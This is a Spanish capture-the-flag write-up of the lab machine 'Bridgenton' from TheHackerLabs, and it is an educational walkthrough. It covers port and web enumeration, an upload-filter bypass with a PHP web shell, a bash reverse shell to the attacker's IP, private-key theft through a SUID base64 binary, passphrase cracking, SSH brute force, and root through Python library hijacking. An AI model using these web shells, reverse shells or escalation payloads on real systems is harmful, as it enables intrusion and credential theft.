---
title: "Bridgenton - TheHackerLabs"
date: 2025-01-20
draft: false
slug: "THL-writeup-Bridgenton"
excerpt: "Esta fue una máquina un poco complicada. Al solo encontrar dos puertos activos, nos vamos al puerto 80 para analizar la página web. Al intentar registrar un nuevo usuario, descubrimos que no nos permite subir ninguna imagen, por lo que realizamos un sniper attack para descubrir qué extensiones ocupa. Una vez descubierta la extensión, subimos un archivo malicioso que nos permite obtener una Reverse Shell de la máquina víctima. Dentro, utilizamos el binario base64 para copiar la llave privada de un usuario, que crackeamos y obtenemos su contraseña para loguearnos en el servicio SSH. Dentro del SSH, encontramos un script de Python al que es posible aplicarle Python Library Hijacking para escalar privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Apache", "PHP", "SSH", "BurpSuite", "Fuzzing", "Web Enumeration", "Sniper Attack", "Abusign File Upload", "Cracking Hash", "Brute Force Attack", "Python Library Hijacking", "Privesc - Python Library Hijacking", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "PHP"
  - "nc"
  - "bash"
  - "find"
  - "base64"
  - "ssh"
  - "chmod"
  - "ssh2john"
  - "JohnTheRipper"
  - "hydra"
  - "sudo"
  - "python3"
links:
  - "https://gtfobins.github.io/gtfobins/base64/"
  - "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=library%20Hijack#python-library-hijacking"
  - "https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-bridgenton/Bridgenton.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.40
PING 192.168.1.40 (192.168.1.40) 56(84) bytes of data.
64 bytes from 192.168.1.40: icmp_seq=1 ttl=64 time=0.937 ms
64 bytes from 192.168.1.40: icmp_seq=2 ttl=64 time=2.68 ms
64 bytes from 192.168.1.40: icmp_seq=3 ttl=64 time=0.752 ms
64 bytes from 192.168.1.40: icmp_seq=4 ttl=64 time=0.869 ms

--- 192.168.1.40 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3023ms
rtt min/avg/max/mdev = 0.752/1.309/2.680/0.794 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.40 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 11:20 CST
Initiating ARP Ping Scan at 11:20
Scanning 192.168.1.40 [1 port]
Completed ARP Ping Scan at 11:20, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:20
Scanning 192.168.1.40 [65535 ports]
Discovered open port 22/tcp on 192.168.1.40
Discovered open port 80/tcp on 192.168.1.40
Completed SYN Stealth Scan at 11:20, 8.93s elapsed (65535 total ports)
Nmap scan report for 192.168.1.40
Host is up, received arp-response (0.00069s latency).
Scanned at 2025-01-20 11:20:50 CST for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
           Raw packets sent: 67294 (2.961MB) | Rcvd: 65538 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que únicamente son dos puertos activos, me da la impresión de que la intrusión será por la página web.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.40 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 11:21 CST
Nmap scan report for 192.168.1.40
Host is up (0.00074s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 ad:fa:fa:1a:e7:99:65:1b:f9:e9:c4:55:be:f5:3a:f3 (ECDSA)
|_  256 d7:87:d7:2e:d9:a3:4e:87:87:3d:b9:b8:ba:89:b5:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-title: Universidad Bridgenton
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Sí, la intrusión será por la página web. 

Vamos a revisarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura1.png">
</p>

Parece la página de una universidad.

Veamos qué tecnologías utiliza:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura2.png">
</p>

Muy bien, parece que está utilizando **PHP**.

Si revisamos el código fuente de la página principal, encontraremos 3 rutas que podemos visitar:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura3.png">
</p>

Si vamos a la primera `registro.php`, nos lleva a una página donde podemos registrar un nuevo usuario:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura4.png">
</p>

Si vamos a `login.php`, nos lleva a un login que supongo es para los usuarios de esta página:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura5.png">
</p>

Por último, si vamos a `profesorado.html`, podremos ver algunos usuarios que podrían ser usuarios registrados tanto en la página como en el **servicio SSH**. Tengámoslos en cuenta para más adelante.

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura6.png">
</p>

Si bien podemos empezar por probar el `registro.php`, apliquemos **Fuzzing** con tal de ver si no hay algún directorio o archivo que no hayamos visto y enfoquémoslo en buscar **archivos PHP**.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://192.168.1.40/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.40/FUZZ.FUZ2Z
Total requests: 441090

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000077:   200        79 L     176 W      2384 Ch     "login - php"                                                                                                                                   
000009929:   200        11 L     22 W       274 Ch      "registrar - php"                                                                                                                               
000034757:   200        23 L     67 W       979 Ch      "registro - php"                                                                                                                                
000090451:   403        9 L      28 W       280 Ch      "php"                                                                                                                                           
000333533:   302        0 L      0 W        0 Ch        "bienvenida - php"                                                                                                                              

Total time: 622.3430
Processed Requests: 441090
Filtered Requests: 441085
Requests/sec.: 708.7569
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para especificar una lista de extensiones a buscar. |

Ahora, probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.40/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.40/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 2392]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.1.40/uploads/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.1.40/javascript/]
/registrar.php        (Status: 200) [Size: 274]
/registro.php         (Status: 200) [Size: 980]
/.php                 (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
/bienvenida.php       (Status: 302) [Size: 0] [--> login.php]
Progress: 661635 / 661638 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Excelente, encontramos bastantes cositas que nos pueden ayudar, por ejemplo, el directorio `/uploads`.

Esto ya me da una idea de cómo será la intrusión.

### Analizando Página registro.php {#Registro}

Vamos a intentar crear un usuario random para ver si se puede registrar:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura7.png">
</p>

Pero cuando mandamos nuestro registro, nos redirige a una página que indica que hubo un error:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura8.png">
</p>

Me parece extraño, ya que el formato de la imagen es el correcto.

Si probamos con un **JPG** también nos dará un error, por lo que ahora tenemos que descubrir cuál es la verdadera extensión que está aceptando.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Sniper Attack para Identificar Archivos Válidos {#Sniper}

Vamos a capturar nuestra petición de creación de un nuevo usuario con **BurpSuite** y la mandaremos al **Intruder**.

Ahí lo vamos a configurar para que haga pruebas en la extensión de la imagen.

Puedes usar el archivo `web-extensions-big.txt` de **seclists** como payload, ya que contiene muchas extensiones a probar.

Lo puedes encontrar en la ruta `/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions-big.txt`:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura9.png">
</p>

Lanza el ataque y observa las respuestas, encontrarás una o varias que nos dirán la extensión que acepta la página:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura10.png">
</p>

Está aceptando la extensión `.phtml`.

### Subiendo Script Malicioso de PHP y Obteniendo una Sesión de la Máquina Víctima {#Shell}

Vamos a crear un script en **PHP** que nos funcione como una shell, para probar si funciona.

Puedes ocupar cualquiera de los dos:

```php
# Forma 1:
<?php
	system($_REQUEST['cmd']);
?>

# Forma 2:
<?php
        system($_GET['cmd']);
?>
```

Una vez que lo tengas, carga el archivo y crea un nuevo usuario:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura11.png">
</p>

Nos lo aceptó, y como ya sabemos que existe un directorio `/uploads`, podemos revisar si ya se encuentra ahí:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura12.png">
</p>

Lo seleccionamos y vamos a meter un argumento en la URL para ver si funciona:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura13.png">
</p>

Funciona.

Para obtener una shell, vamos a abrir una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Mandaremos nuestra **Reverse Shell** de confianza de **Bash** en la URL:
```bash
bash -c "bash -i >%26 /dev/tcp/Tu_IP/443 0>%261"
```

Y observa el resultado cuando la envíes:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.40] 43452
bash: cannot set terminal process group (572): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Bridgenton:/var/www/html/uploads$ whoami
whoami
www-data
```

Ya solo obtén una sesión interactiva.

### Obteniendo y Crackeando Llave Privada de Usuario James {#Crack}

Antes que nada, vamos a ver qué podemos encontrarnos en el directorio actual:
```bash
www-data@Bridgenton:/var/www/html$ ls -la
total 812
drwxr-xr-x 3 www-data www-data   4096 Apr  1  2024 .
drwxr-xr-x 3 root     root       4096 Mar 29  2024 ..
-rwxr-xr-x 1 www-data www-data 336341 Mar 29  2024 alcala.jpg
-rwxr-xr-x 1 www-data www-data   1799 Mar 29  2024 bienvenida.php
-rw-r--r-- 1 www-data www-data   4289 Mar 29  2024 index.html
-rw-r--r-- 1 www-data www-data 158295 Mar 29  2024 james.jpg
-rwxr-xr-x 1 www-data www-data 143371 Mar 29  2024 juan.jpeg
-rwxr-xr-x 1 www-data www-data   2392 Mar 29  2024 login.php
-rwxr-xr-x 1 www-data www-data 135118 Mar 29  2024 maria.jpeg
-rwxr-xr-x 1 www-data www-data   1672 Mar 29  2024 procesar_login.php
-rw-r--r-- 1 www-data www-data   1312 Apr  1  2024 procesar_registro.php
-rw-r--r-- 1 www-data www-data   2789 Mar 29  2024 profesorado.html
-rw-r--r-- 1 www-data www-data   1543 Mar 29  2024 registrar.php
-rw-r--r-- 1 www-data www-data    980 Apr  1  2024 registro.php
drwxrwxrwx 2 www-data www-data   4096 Jan 20 19:25 uploads
```

Y curiosamente, nuestro archivo **PHP** malicioso ya no existe:
```bash
www-data@Bridgenton:/var/www/html$ ls -la uploads
total 8
drwxrwxrwx 2 www-data www-data 4096 Jan 20 19:25 .
drwxr-xr-x 3 www-data www-data 4096 Apr  1  2024 ..
```
Supongo que debe de haber un proceso en segundo plano que elimine el contenido de ese directorio.

Además, revisando los scripts de **PHP** que están aquí, encontré las credenciales de un usuario dentro del script `procesar_login.php`:
```bash
www-data@Bridgenton:/var/www/html$ cat procesar_login.php 
<?php
// Iniciar la sesión
session_start();
...
...
        // Ejemplo básico: verificar que el correo electrónico sea "james@thl.com" y la contraseña sea "bridgenton_200189"
        if ($email === "james@thl.com" && $password === "bridgenton_200189") {
            // Inicio de sesión exitoso
            // Establecer el correo electrónico en la sesión
            $_SESSION['email'] = $email;
            // Redirigir al usuario a la página de bienvenida
            header("Location: bienvenida.php");
            exit();
...
...
```

Si las probamos en la página, nos dirán que son credenciales válidas:

<p align="center">
<img src="/assets/images/THL-writeup-bridgenton/Captura14.png">
</p>

Y nos dan una pista de un usuario que puede ser válido para el **servicio SSH**.

Ahora sí, sigamos con nuestro objetivo principal.

Como el usuario **www-data** no siempre tiene muchos privilegios, tenemos que buscar la forma de loguearnos como un usuario válido.

Revisando el `/etc/passwd` encontramos a un usuario llamado **james**, que es el mismo que encontramos en un script:
```bash
www-data@Bridgenton:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
...
...
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
james:x:1000:1000:james,,,:/home/james:/bin/bash
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
mysql:x:102:109:MySQL Server,,,:/nonexistent:/bin/false
```

El problema es que no podemos ver nada de su directorio, pero podemos buscar los **binarios SUID** que podemos usar:
```bash
www-data@Bridgenton:/var/www/html$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/base64
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Si buscamos en **GTFOBins** el binario **base64**, encontraremos que puede ser usado para ver cualquier archivo de quien sea:
* <a href="https://gtfobins.github.io/gtfobins/base64/" target="_blank">GTFOBins: base64</a>

Ya sabemos que existe el **usuario james**, por lo que una idea sería robarle su llave privada **id_rsa**.

Podemos hacerlo de la siguiente manera, tal como lo explica **GTFOBins**:
```bash
www-data@Bridgenton:/var/www/html$ LFILE=/home/james/.ssh/id_rsa
www-data@Bridgenton:/var/www/html$ base64 "$LFILE" | base64 --decode
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jd
....
....
....
```

La copiamos en nuestra máquina y le asignamos sus permisos necesarios:
```bash
nano id_rsa
chmod 600 id_rsa
```

Intentemos entrar al **servicio SSH** con esta llave:
```bash
ssh -i id_rsa james@192.168.1.40
james@192.168.1.40's password:
```
No nos dejó.

Parece que será necesario crackearla, con tal de obtener la frase que se usó en su creación y que nos servirá de contraseña para entrar.

Usaremos **ssh2john** para darle un formato a la llave que pueda usar **JohnTheRipper**:
```bash
ssh2john id_rsa > hash
```

Ya solo la crackeamos y esperamos obtener la contraseña:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bowwow           (id_rsa)     
1g 0:00:00:11 DONE (2025-01-20 14:50) 0.08726g/s 27.92p/s 27.92c/s 27.92C/s 50cent..101010
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
La tenemos.

Probemos a ver si funciona:
```bash
ssh -i id_rsa james@192.168.1.40
james@192.168.1.40's password: 
Linux Bridgenton 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 20 19:36:24 2025 from Tu_IP
james@Bridgenton:~$ whoami
james
```
Listo, ya estamos dentro.

Ya solo obtenemos la flag del usuario:
```bash
james@Bridgenton:~$ ls -la
total 36
drwx------ 4 james james 4096 abr  2  2024 .
drwxr-xr-x 3 root  root  4096 mar 29  2024 ..
lrwxrwxrwx 1 root  root     9 abr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 mar 29  2024 .bash_logout
-rw-r--r-- 1 james james 3526 mar 29  2024 .bashrc
drwxr-xr-x 3 james james 4096 abr  1  2024 .local
-rw-r--r-- 1 james james  807 mar 29  2024 .profile
-rw------- 1 root  james    5 mar 30  2024 .python_history
drwx------ 2 james james 4096 abr  2  2024 .ssh
-rw-r--r-- 1 james james    0 abr  1  2024 .sudo_as_admin_successful
-rw-r--r-- 1 james james   33 abr  2  2024 user.txt
james@Bridgenton:~$ cat user.txt
...
```

### Aplicando Fuerza Bruta al Servicio SSH para Encontrar Contraseña de Usuario James {#FuerzaBruta}

Como ya tenemos un usuario válido para el **servicio SSH**, podemos intentar aplicarle fuerza bruta.

Quizá podemos encontrar la contraseña de dicho usuario.

Usaremos **hydra** para aplicar el ataque:
```bash
hydra -l james -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.40
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 12:33:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.40:22/
[STATUS] 245.00 tries/min, 245 tries in 00:01h, 14344156 to do in 975:48h, 14 active
[22][ssh] host: 192.168.1.40   login: james   password: bowwow
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 12:35:05
```
De igual forma, obtuvimos su contraseña.

No tardo mucho en encontrar la contraseña.

## Post Explotación {#Post}

### Aplicando Python Library Hijacking para Escalar Privilegios {#PythonHijacking}

Vamos a enumerar la máquina.

Primero, veamos con qué privilegios contamos:
```bash
james@Bridgenton:~$ sudo -l
Matching Defaults entries for james on Bridgenton:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User james may run the following commands on Bridgenton:
    (root) NOPASSWD: /usr/bin/python3 /opt/example.py
```
Parece que podemos usar un script de **Python**.

Vamos a ver que hace este script:
```bash
james@Bridgenton:~$ cat /opt/example.py
import hashlib 

if __name__ == '__main__':

        cadena = "Hola esta es mi cadena"

        print(hashlib.md5(cadena.encode()).hexdigest())
```

Parece que el script convierte una cadena de texto en un **hash de MD5** y luego lo muestra en hexadecimal:
```bash
james@Bridgenton:~$ python3 /opt/example.py
81f4463d7bee15a7aa32e49e4d77fef9
```

Si vemos los permisos del script, únicamente el **Root** lo puede modificar, por lo que no podremos modificarlo para escalar privilegios:
```bash
james@Bridgenton:/opt$ ls -la
total 12
drwxr-xr-x  2 james root 4096 abr  1  2024 .
drwxr-xr-x 18 root  root 4096 mar 29  2024 ..
-rw-r--r--  1 root  root  132 abr  1  2024 example.py
```

Pero en el directorio `/opt`, si tenemos permisos para crear cualquier archivo:
```bash
james@Bridgenton:/opt$ ls -ld
drwxr-xr-x 2 james root 4096 ene 20 19:44 .
```

Pareciera que no hay nada que podamos hacer, pero no es así, pues podemos intentar aplicar **Python Library Hijacking**.

¿Qué es **Python Library Hijacking**?

| **Python Library Hijacking** |
|:-----------:|
| *La vulnerabilidad conocida como Python Library Hijacking ocurre cuando un atacante aprovecha el mecanismo de carga de módulos de Python para ejecutar código malicioso. Esto puede suceder cuando el entorno de ejecución permite cargar módulos Python desde ubicaciones controladas por el atacante, en lugar de utilizar las bibliotecas legítimas.* |

Revisa el escenario 2 del siguiente blog:
* <a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8" target="_blank">Python Library Hijacking on Linux (with examples)</a>

La idea, es aprovecharnos del módulo que está ocupando el script, para que ejecute un script malicioso que suplante a dicho módulo.

Podemos identificar qué módulos está utilizando el script usando la **librería sys** y mostrando el **path del directorio actual**.

Lo podemos hacer de dos formas:

* Forma 1:
```bash
james@Bridgenton:/opt$ python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python311.zip', '/usr/lib/python3.11', '/usr/lib/python3.11/lib-dynload', '/usr/local/lib/python3.11/dist-packages', '/usr/lib/python3/dist-packages']
```

* Forma 2:

```bash
james@Bridgenton:/opt$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python311.zip
/usr/lib/python3.11
/usr/lib/python3.11/lib-dynload
/usr/local/lib/python3.11/dist-packages
/usr/lib/python3/dist-packages
```

Si te das cuenta, el directorio actual está siendo utilizado para buscar módulos que necesite el script de **Python**.

Entonces, podemos aprovecharnos de esto para suplantar a **hashlib** y se ejecute un script malicioso como si lo ejecutara el **Root**.

Esta es la ruta común del **módulo hashlib**: `/usr/lib/python3.x/hashlib.py`.

Vamos a suplantar ese script y a crear uno malicioso para cambiar los permisos de la **Bash** a **permisos SUID**. Esto lo guardaremos en el mismo directorio donde se encuentra el script `example.py`.

Llamaremos al script igual que al que vamos a suplantar y tendrá lo siguiente:
```python
import os

os.system("chmod u+s /bin/bash")
```

Bien, antes de ejecutarlo, veamos los permisos de la **Bash**:
```bash
james@Bridgenton:/opt$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Aún no podemos usarla.

Ahora ejecutemos el script y debería darnos un error al ejecutarse, ya que dicho script no tiene las mismas instrucciones que el verdadero:
```bash
james@Bridgenton:/opt$ sudo /usr/bin/python3 /opt/example.py
Traceback (most recent call last):
  File "/opt/example.py", line 9, in <module>
    print(hashlib.md5(cadena.encode()).hexdigest())
          ^^^^^^^^^^^
AttributeError: module 'hashlib' has no attribute 'md5'
```

Excelente, revisemos si cambiaron los permisos de la **Bash**:
```bash
james@Bridgenton:/opt$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Sí cambio.

Ya solo ejecutamos la **Bash** con privilegios y seremos **Root**:
```bash
james@Bridgenton:/opt$ bash -p
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Con esto, terminamos la máquina.
